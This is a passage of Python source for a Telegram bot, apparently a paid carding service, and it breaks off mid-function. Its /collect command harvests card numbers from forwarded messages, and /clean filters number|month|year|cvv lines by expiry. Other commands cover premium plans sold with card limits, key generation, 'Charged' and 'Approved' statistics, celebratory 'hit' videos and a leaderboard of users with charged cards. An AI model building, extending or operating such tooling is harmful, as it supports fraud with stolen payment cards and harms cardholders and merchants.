@client.on(events.NewMessage(pattern=r'/iban\s+'))
async def iban_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        iban = event.message.text.split()[1].strip(); valid = iban_validator(iban)
        msg = pe(f"""🏦 {bs('IBAN Validation')}

📌 {bs('IBAN')}: <code>{iban}</code>
✅ {bs('Status')}: {'Valid' if valid else 'Invalid'}""")
        await styled_reply(event, msg, emoji_ids=[CE["info"]])
    except IndexError: await styled_reply(event, f"📝 {bs('Usage')}: <code>/iban GB82WEST12345698765432</code>", emoji_ids=[CE["info"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

# ─── File tools (bot13 names) ────────────────────────────────────────────
TEMP_FILE_DATA = {}; COLLECT_DATA = {}; COLLECT_TIMERS = {}; MERGE_DATA = {}; MERGE_TIMERS = {}
@client.on(events.NewMessage(pattern='/split'))
async def split_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} {bs('Reply to a .txt file.')}", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message()
    if not rm.file or not rm.file.name.endswith('.txt'): return await styled_reply(event, f"{PE} {bs('Please reply to a .txt file.')}", emoji_ids=[CE["warn"]])
    try:
        fp = await rm.download_media()
        async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f: lines = await f.readlines()
        lines = [l.strip() for l in lines if l.strip()]
        if not lines: await styled_reply(event, f"{PE} {bs('File is empty.')}", emoji_ids=[CE["warn"]]); os.remove(fp); return
        btns = [[pbtn(bs("500"), f"split_size:500:{event.sender_id}"), pbtn(bs("1000"), f"split_size:1000:{event.sender_id}")],
                [pbtn(bs("2000"), f"split_size:2000:{event.sender_id}"), pbtn(bs("5000"), f"split_size:5000:{event.sender_id}")],
                [pbtn(bs("Cancel"), "cancel_split")]]
        await styled_reply(event, f"{PE} {bs('File loaded')}: {len(lines)} {bs('lines.')}\n{bs('Select chunk size:')}", buttons=btns, emoji_ids=[CE["info"]])
        TEMP_FILE_DATA[event.sender_id] = {'lines': lines, 'file_path': fp}
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.CallbackQuery(pattern=rb"split_size:(\d+):(\d+)"))
async def split_size_cb(event):
    cs = int(event.pattern_match.group(1).decode()); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"❌ {bs('Not your session!')}", alert=True)
    if uid not in TEMP_FILE_DATA: return await event.edit(pe(f"{PE} {bs('Session expired.')}"), parse_mode='html')
    d = TEMP_FILE_DATA.pop(uid); lines = d['lines']; fp = d['file_path']; os.remove(fp)
    chunks = [lines[i:i+cs] for i in range(0, len(lines), cs)]
    for idx, ch in enumerate(chunks):
        fn = f"split_{idx+1}.txt"
        async with aiofiles.open(fn,'w') as f:
            for l in ch: await f.write(l+"\n")
        await styled_send(uid, f"{bs('Part')} {idx+1} ({len(ch)} {bs('lines')})", file=fn)
        os.remove(fn)
    await event.edit(pe(f"✅ {bs('Split complete')}: {len(chunks)} {bs('parts.')}"), parse_mode='html'); await event.answer("Done!", alert=False)

@client.on(events.CallbackQuery(data=b"cancel_split"))
async def cancel_split(event):
    uid = event.sender_id
    if uid in TEMP_FILE_DATA:
        d = TEMP_FILE_DATA.pop(uid)
        if os.path.exists(d['file_path']): os.remove(d['file_path'])
    await event.edit(pe(f"{PE} {bs('Cancelled.')}"), parse_mode='html'); await event.answer("Cancelled", alert=True)

@client.on(events.NewMessage(pattern='/merge'))
async def merge_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    if event.sender_id in MERGE_DATA: return await styled_reply(event, f"{PE} {bs('You already have a merge session active. Use /cancelmerge to stop.')}", emoji_ids=[CE["warn"]])
    MERGE_DATA[event.sender_id] = {'files': []}
    await styled_reply(event, f"{PE} {bs('Please send the .txt files you want to merge (one by one). When done, send /donemerge.')}", emoji_ids=[CE["info"]])
    MERGE_TIMERS[event.sender_id] = asyncio.create_task(merge_timeout(event.sender_id))
async def merge_timeout(uid):
    await asyncio.sleep(300)
    if uid in MERGE_DATA:
        MERGE_DATA.pop(uid, None)
        try: await styled_send(uid, f"{PE} {bs('Merge session timed out.')}", emoji_ids=[CE["warn"]])
        except: pass
@client.on(events.NewMessage(func=lambda e: e.file and e.file.name.endswith('.txt')))
async def merge_file_recv(event):
    uid = event.sender_id
    if uid not in MERGE_DATA: return
    fp = await event.download_media()
    MERGE_DATA[uid]['files'].append(fp)
    await styled_reply(event, f"✅ {bs('Added')} {event.file.name} ({len(MERGE_DATA[uid]['files'])} {bs('files so far')}).", emoji_ids=[CE["check"]])
@client.on(events.NewMessage(pattern='/donemerge'))
async def donemerge_cmd(event):
    uid = event.sender_id
    if uid not in MERGE_DATA: return await styled_reply(event, f"{PE} {bs('No merge session active.')}", emoji_ids=[CE["warn"]])
    files = MERGE_DATA[uid]['files']
    if not files: return await styled_reply(event, f"{PE} {bs('No files collected.')}", emoji_ids=[CE["warn"]])
    if uid in MERGE_TIMERS: MERGE_TIMERS[uid].cancel(); del MERGE_TIMERS[uid]
    merged = []
    for fp in files:
        try:
            async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f: merged.extend(await f.readlines())
            os.remove(fp)
        except: pass
    if not merged: return await styled_reply(event, f"{PE} {bs('No lines read.')}", emoji_ids=[CE["warn"]])
    fn = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fn,'w') as f:
        for l in merged: await f.write(l)
    await styled_send(uid, f"✅ {bs('Merged')} {len(files)} {bs('files')} ({len(merged)} {bs('lines')})", file=fn)
    os.remove(fn); del MERGE_DATA[uid]
@client.on(events.NewMessage(pattern='/cancelmerge'))
async def cancelmerge_cmd(event):
    uid = event.sender_id
    if uid in MERGE_DATA:
        for fp in MERGE_DATA[uid]['files']:
            try: os.remove(fp)
            except: pass
        del MERGE_DATA[uid]
    if uid in MERGE_TIMERS: MERGE_TIMERS[uid].cancel(); del MERGE_TIMERS[uid]
    await styled_reply(event, f"{PE} {bs('Merge cancelled.')}", emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern='/collect'))
async def collect_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    if event.sender_id in COLLECT_DATA: return await styled_reply(event, f"{PE} {bs('You already have a collect session active. Use /cancelcollect to stop.')}", emoji_ids=[CE["warn"]])
    COLLECT_DATA[event.sender_id] = {'cards': []}
    await styled_reply(event, f"{PE} {bs('Please forward messages containing cards (one by one). When done, send /donecollect.')}", emoji_ids=[CE["info"]])
    COLLECT_TIMERS[event.sender_id] = asyncio.create_task(collect_timeout(event.sender_id))
async def collect_timeout(uid):
    await asyncio.sleep(300)
    if uid in COLLECT_DATA:
        COLLECT_DATA.pop(uid, None)
        try: await styled_send(uid, f"{PE} {bs('Collect session timed out.')}", emoji_ids=[CE["warn"]])
        except: pass
@client.on(events.NewMessage(func=lambda e: e.forward))
async def collect_fwd(event):
    uid = event.sender_id
    if uid not in COLLECT_DATA: return
    if event.text:
        cc = extract_cc(event.text)
        if cc:
            COLLECT_DATA[uid]['cards'].extend(cc)
            await styled_reply(event, f"✅ {bs('Collected')} {len(cc)} {bs('cards')} ({bs('total')} {len(COLLECT_DATA[uid]['cards'])}).", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} {bs('No cards found in that message.')}", emoji_ids=[CE["warn"]])
    else: await styled_reply(event, f"{PE} {bs('Message has no text.')}", emoji_ids=[CE["warn"]])
@client.on(events.NewMessage(pattern='/donecollect'))
async def donecollect_cmd(event):
    uid = event.sender_id
    if uid not in COLLECT_DATA: return await styled_reply(event, f"{PE} {bs('No collect session active.')}", emoji_ids=[CE["warn"]])
    cards = COLLECT_DATA[uid]['cards']
    if not cards: return await styled_reply(event, f"{PE} {bs('No cards collected.')}", emoji_ids=[CE["warn"]])
    if uid in COLLECT_TIMERS: COLLECT_TIMERS[uid].cancel(); del COLLECT_TIMERS[uid]
    fn = f"collected_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fn,'w') as f:
        for c in cards: await f.write(c+"\n")
    await styled_send(uid, f"✅ {bs('Collected')} {len(cards)} {bs('cards.')}", file=fn)
    os.remove(fn); del COLLECT_DATA[uid]
@client.on(events.NewMessage(pattern='/cancelcollect'))
async def cancelcollect_cmd(event):
    uid = event.sender_id
    if uid in COLLECT_DATA: del COLLECT_DATA[uid]
    if uid in COLLECT_TIMERS: COLLECT_TIMERS[uid].cancel(); del COLLECT_TIMERS[uid]
    await styled_reply(event, f"{PE} {bs('Collect cancelled.')}", emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern='/clean'))
async def clean_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} {bs('Reply to a .txt file.')}", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message()
    if not rm.file or not rm.file.name.endswith('.txt'): return await styled_reply(event, f"{PE} {bs('Please reply to a .txt file.')}", emoji_ids=[CE["warn"]])
    try:
        fp = await rm.download_media()
        async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f: lines = await f.readlines()
        os.remove(fp); cards = [l.strip() for l in lines if l.strip()]
        if not cards: return await styled_reply(event, f"{PE} {bs('File is empty.')}", emoji_ids=[CE["warn"]])
        cy = datetime.now().year; cleaned = []; removed = []
        for cs in cards:
            p = cs.split('|')
            if len(p) != 4: removed.append(cs); continue
            _,_,yy,_ = p
            try:
                y = int(yy)
                if y < cy or y > cy+20: removed.append(cs)
                else: cleaned.append(cs)
            except: removed.append(cs)
        if not cleaned: return await styled_reply(event, f"{PE} {bs('All cards were expired/invalid.')}", emoji_ids=[CE["warn"]])
        fn = f"cleaned_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fn,'w') as f:
            for c in cleaned: await f.write(c+"\n")
        await styled_send(event.sender_id, f"✅ {bs('Cleaned')}: {len(cleaned)} {bs('cards')} ({bs('removed')} {len(removed)})", file=fn)
        os.remove(fn)
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

# ─── Admin (bot13) ──────────────────────────────────────────────────────
@client.on(events.NewMessage(pattern='/addpremium'))
async def addpremium_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 3: return await styled_reply(event, f"{PE} {bs('Usage')}: <code>/addpremium user_id days</code>", emoji_ids=[CE["warn"]])
    try:
        tid = int(parts[1]); days = int(parts[2]); await ensure_user(tid); await set_user_plan(tid, "Core", days)
        await styled_reply(event, f"✅ {bs('User')} <code>{tid}</code> {bs('added to premium for')} {days} {bs('days!')}", emoji_ids=[CE["check"]])
        try: await styled_send(tid, f"🎉 {bs('Congratulations! You have been granted premium access to the bot!')}", emoji_ids=[CE["fire"]])
        except: pass
    except ValueError: await styled_reply(event, f"{PE} {bs('Invalid user ID.')}", emoji_ids=[CE["cross"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/removepremium'))
async def removepremium_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2: return await styled_reply(event, f"{PE} {bs('Usage')}: <code>/removepremium user_id</code>", emoji_ids=[CE["warn"]])
    try:
        tid = int(parts[1]); cp = await get_user_plan(tid)
        if not is_paid_plan(cp): return await styled_reply(event, f"{PE} {bs('User is not premium.')}", emoji_ids=[CE["warn"]])
        await set_user_plan(tid, "Bronze", 0)
        await styled_reply(event, f"✅ {bs('User')} <code>{tid}</code> {bs('removed from premium.')}", emoji_ids=[CE["check"]])
        try: await styled_send(tid, f"{PE} {bs('Your premium access has been revoked.')}", emoji_ids=[CE["warn"]])
        except: pass
    except ValueError: await styled_reply(event, f"{PE} {bs('Invalid user ID.')}", emoji_ids=[CE["cross"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/listpremium'))
async def listpremium_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    users = []
    for tier in PAID_TIERS:
        async for u in users_col.find({"plan": tier}): users.append(u)
    if not users: return await styled_reply(event, f"{PE} {bs('No premium users found.')}", emoji_ids=[CE["warn"]])
    lines = []
    for u in users:
        uid = u.get("user_id"); plan = u.get("plan","?"); exp = u.get("expiry"); es = exp.strftime('%Y-%m-%d') if exp else "Never"
        lines.append(f"• <code>{uid}</code> ━ {plan} ━ {es}")
    await styled_reply(event, f"👑 {bs('Premium Users')} ({len(users)})\n\n" + "\n".join(lines), emoji_ids=[CE["crown"]])

@client.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 4 or len(parts) > 5: return await styled_reply(event, f"{PE} {bs('Usage')}: <code>/genkeys amount hours user_limit [price]</code>", emoji_ids=[CE["warn"]])
    try:
        amount = int(parts[1]); hours = int(parts[2]); ulimit = int(parts[3]); price = float(parts[4]) if len(parts)==5 else 0.0
        keys = []
        for _ in range(amount):
            k = f"ZERO_{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))}"
            keys.append(k)
            await keys_col.insert_one({"key":k,"hours":hours,"user_limit":ulimit,"price":price,"used_count":0,"used_by":[],"created_at":datetime.utcnow(),"expires_at":datetime.utcnow()+timedelta(hours=hours)})
        txt = "\n".join(f"┣ <code>{k}</code>" for k in keys)
        await styled_reply(event, f"""⭐ {bs('Keys Generated')}   (x{amount})   
━━━━━━━━━━━━━━━━━━
{txt}
┗ 📅 {bs('Period')}: {hours}h
           ┗ 👥 {bs('Users')}: {ulimit}
           ┗ 💰 {bs('Price')}: ${price:.2f}
      
✅ {bs('Use')} <code>/redeem KEY</code> {bs('to redeem')}""", emoji_ids=[CE["crown"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    parts = event.raw_text.split()
    if len(parts) != 2: return await styled_reply(event, f"{PE} {bs('Usage')}: <code>/redeem KEY</code>", emoji_ids=[CE["warn"]])
    key = parts[1].upper(); kd = await keys_col.find_one({"key": key})
    if not kd: return await styled_reply(event, f"{PE} {bs('Invalid Key!')}", emoji_ids=[CE["cross"]])
    if kd.get("used_count",0) >= kd.get("user_limit",1): return await styled_reply(event, f"{PE} {bs('This key has reached its limit')}", emoji_ids=[CE["cross"]])
    uid = event.sender_id
    if str(uid) in kd.get("used_by",[]): return await styled_reply(event, f"{PE} {bs('You have already used this key!')}", emoji_ids=[CE["cross"]])
    if is_paid_plan(await get_user_plan(uid)): return await styled_reply(event, f"{PE} {bs('You already have premium access!')}", emoji_ids=[CE["warn"]])
    hours = kd.get("hours",24); await set_user_plan(uid, "Core", hours//24 if hours>=24 else 1)
    await keys_col.update_one({"key":key},{"$inc":{"used_count":1},"$push":{"used_by":str(uid)}})
    await styled_reply(event, f"""🎉 {bs('Congratulations!')}
⭐ {bs('VIP Access Activated!')} 📅 {bs('Duration')}: {hours}h
""", emoji_ids=[CE["fire"]])

@client.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count(); ts = await get_total_sites_count(); tc = await get_total_cards_count(); ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Sites')}:</b> <code>{ts}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"],CE["fire"],CE["chart"],CE["link"],CE["gem"],CE["brain"],CE["shield"]])
    except Exception as e: await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/status'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        st = await _build_status_text()
        await styled_reply(event, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except Exception as e: await styled_reply(event, f"⚠️ <code>{e}</code>")

@client.on(events.NewMessage(pattern='/maintenance'))
async def maint_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2 or parts[1].lower() not in ('on','off'): return await styled_reply(event, f"{PE} {bs('Usage')}: /maintenance on/off", emoji_ids=[CE["warn"]])
    await set_maintenance_mode(parts[1].lower()=='on')
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if parts[1].lower()=='on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if parts[1].lower()=='on' else CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan(1|2|3|4)\b'))
async def plan_assign(event):
    if event.sender_id not in ADMIN_ID: return
    pk = event.pattern_match.group(1).decode(); plan_key = f"plan{pk}"
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: tid = int(parts[1])
    except: return await styled_reply(event, f"{PE} {bs('Invalid ID')}", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try: ent = await client_instance.get_entity(tid); name = getattr(ent,'first_name',None) or "Unknown"
    except: name = "Unknown"
    await ensure_user(tid); await set_user_plan(tid, pi["tier"], pi["duration_days"])
    exp = (datetime.now()+timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"""<b>✅ {bs('Plan Updated')}</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={tid}'>{name}</a>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{exp}</code>""")
    try: await styled_send(tid, f"""<b>🎉 {bs('Plan Upgraded!')} 🎉</b>
{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>
{bs('Limit')}: {get_cc_limit(pi['tier'])} CCs
{bs('Expires')}: {exp}""")
    except: pass

@client.on(events.NewMessage(pattern='/rplan'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: tid = int(parts[1])
    except: return await styled_reply(event, f"{PE} {bs('Invalid')}", emoji_ids=[CE["cross"]])
    await ensure_user(tid); cp = await get_user_plan(tid)
    if not is_paid_plan(cp): return await styled_reply(event, f"{PE} {bs('No active plan')}", emoji_ids=[CE["cross"]])
    try: ent = await client_instance.get_entity(tid); name = getattr(ent,'first_name',None) or "?"
    except: name = "?"
    await set_user_plan(tid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {name}</b>", emoji_ids=[CE["check"]])
    try: await styled_send(tid, f"{PE} <b>{bs('Your plan has been ended. Contact admin to renew.')}</b>", emoji_ids=[CE["warn"]])
    except: pass

@client.on(events.NewMessage(pattern='/planall'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    users = []
    for tier in PAID_TIERS:
        async for u in users_col.find({"plan": tier}): users.append(u)
    if not users: return await styled_reply(event, f"{PE} {bs('No active plans')}", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fn,'w') as f:
        await f.write(f"ACTIVE PLANS ({len(users)})\n{'='*40}\n")
        for u in users:
            uid = u.get("user_id"); tier = u.get("plan","?"); exp = u.get("expiry"); es = exp.strftime('%Y-%m-%d') if exp else "?"
            try: ent = await client_instance.get_entity(uid); un = getattr(ent,'first_name',None) or "?"
            except: un = "?"
            await f.write(f"{un} | {uid} | {tier} | {es}\n")
    try: await styled_send(event.chat_id, f"{PE} <b>{bs('Plans')} ({len(users)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except: pass
    try: os.remove(fn)
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.](addadmin|adminadd)\b'))
async def addadmin_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/addadmin user_id</code>", emoji_ids=[CE["warn"]])
    try:
        uid = int(parts[1])
        if uid not in ADMIN_ID: ADMIN_ID.append(uid); await styled_reply(event, f"✅ {bs('Admin')} {uid} {bs('added.')}", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} {bs('Already admin.')}", emoji_ids=[CE["warn"]])
    except: await styled_reply(event, f"{PE} {bs('Invalid ID')}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.](removeadmin|adminrm)\b'))
async def removeadmin_cmd(event):
    if event.sender_id != ADMIN_ID[0]: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/removeadmin user_id</code>", emoji_ids=[CE["warn"]])
    try:
        uid = int(parts[1])
        if uid in ADMIN_ID: ADMIN_ID.remove(uid); await styled_reply(event, f"✅ {bs('Admin')} {uid} {bs('removed.')}", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} {bs('Not an admin.')}", emoji_ids=[CE["warn"]])
    except: await styled_reply(event, f"{PE} {bs('Invalid ID')}", emoji_ids=[CE["cross"]])

BOT_ENABLED = True
@client.on(events.NewMessage(pattern='/toggle'))
async def toggle_cmd(event):
    if event.sender_id != ADMIN_ID[0]: return
    global BOT_ENABLED; BOT_ENABLED = not BOT_ENABLED
    await styled_reply(event, f"✅ {bs('Bot is now')} {'ENABLED' if BOT_ENABLED else 'DISABLED'}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/ping'))
async def ping_cmd(event):
    st = time.time(); m = await styled_reply(event, f"🏓 {bs('Pong!')}", emoji_ids=[CE["check"]]); en = time.time()
    await styled_edit(m, f"🏓 {bs('Pong!')} <code>{(en-st)*1000:.2f}ms</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/all'))
async def all_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/all message</code>", emoji_ids=[CE["warn"]])
    msg = parts[1]; users = []
    async for u in users_col.find({},{"user_id":1}): users.append(u.get("user_id"))
    sent = 0
    for uid in users:
        try: await styled_send(uid, pe(msg), parse_mode='html'); sent += 1; await asyncio.sleep(0.05)
        except: pass
    await styled_reply(event, f"✅ {bs('Broadcast sent to')} {sent} {bs('users.')}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/fb'))
async def fb_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} {bs('Reply to a media message.')}", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message()
    try:
        await client.forward_messages(JOIN_GROUP_ID, rm)
        await styled_reply(event, f"✅ {bs('Forwarded to group.')}", emoji_ids=[CE["check"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Failed to forward')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/setwelcomevideo'))
async def setwelcomevideo_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} {bs('Please reply to a video file with /setwelcomevideo')}", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message()
    if not rm.video and not rm.document: return await styled_reply(event, f"{PE} {bs('Not a valid video file.')}", emoji_ids=[CE["cross"]])
    try:
        p = os.path.join(VIDEO_DIR,"welcome.mp4")
        await styled_reply(event, f"{PE} {bs('Downloading video...')}", emoji_ids=[CE["info"]])
        await client.download_media(rm, p)
        await styled_reply(event, f"✅ {bs('Welcome video updated successfully!')}", emoji_ids=[CE["check"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/addhitvideo'))
async def addhitvideo_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if not event.reply_to_msg_id: return await styled_reply(event, f"{PE} {bs('Please reply to a video file with /addhitvideo')}", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message()
    if not rm.video and not rm.document: return await styled_reply(event, f"{PE} {bs('Not a valid video file.')}", emoji_ids=[CE["cross"]])
    try:
        fn = f"hit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        p = os.path.join(VIDEO_DIR, fn)
        await styled_reply(event, f"{PE} {bs('Downloading video...')}", emoji_ids=[CE["info"]])
        await client.download_media(rm, p)
        await styled_reply(event, f"✅ {bs('Hit video added')}: <code>{fn}</code>", emoji_ids=[CE["check"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/removehitvideo'))
async def removehitvideo_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2: return await styled_reply(event, f"{PE} {bs('Usage')}: <code>/removehitvideo &lt;index&gt;</code>\n{bs('Use /listhitvideos to see indices.')}", emoji_ids=[CE["warn"]])
    try:
        idx = int(parts[1])-1; vids = get_hit_video_paths()
        if idx < 0 or idx >= len(vids): return await styled_reply(event, f"{PE} {bs('Invalid index. Use /listhitvideos to see available videos.')}", emoji_ids=[CE["cross"]])
        vp = vids[idx]; os.remove(vp)
        await styled_reply(event, f"✅ {bs('Removed')}: <code>{os.path.basename(vp)}</code>", emoji_ids=[CE["check"]])
    except ValueError: await styled_reply(event, f"{PE} {bs('Invalid index. Must be a number.')}", emoji_ids=[CE["cross"]])
    except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/listhitvideos'))
async def listhitvideos_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    vids = get_hit_video_paths()
    if not vids: return await styled_reply(event, f"{PE} {bs('No hit videos found.')}", emoji_ids=[CE["warn"]])
    txt = pe(f"🎬 {bs('Hit Videos')}:\n\n")
    for i,v in enumerate(vids,1): txt += f"{i}. {os.path.basename(v)}\n"
    await styled_reply(event, txt, emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern='/hitvideo'))
async def hitvideo_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    vids = get_hit_video_paths()
    if vids:
        try:
            vp = random.choice(vids)
            await client.send_file(event.chat.id, file=vp, caption=pe(f"🎬 {bs('Hit animation!')}"), supports_streaming=True)
            await styled_reply(event, f"✅ {bs('Sent a random hit video!')}", emoji_ids=[CE["check"]])
        except Exception as e: await styled_reply(event, f"{PE} {bs('Error')}: {e}", emoji_ids=[CE["cross"]])
    else: await styled_reply(event, f"{PE} {bs('No hit videos found. Use /addhitvideo to add.')}", emoji_ids=[CE["warn"]])

# ─── Rank ──────────────────────────────────────────────────────────────────
@client.on(events.NewMessage(pattern='/rank'))
async def rank_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    data = await get_rank_data(10)
    if not data: return await styled_reply(event, f"{PE} {bs('No charged cards yet.')}", emoji_ids=[CE["warn"]])
    txt = pe(f"🏆 {bs('Top 10 Charged Users')}\n\n")
    for i, ent in enumerate(data,1):
